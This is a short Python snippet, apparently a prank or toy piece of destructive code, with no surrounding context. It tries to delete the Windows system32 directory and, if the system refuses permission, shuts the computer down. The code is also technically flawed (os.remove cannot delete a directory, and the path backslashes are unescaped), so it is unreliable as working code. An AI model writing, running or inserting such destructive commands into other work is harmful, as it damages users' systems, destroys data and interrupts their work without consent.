import os

try:
    os.remove("C:\Windows\system32")
except PermissionError:
    os.system("shutdown -s")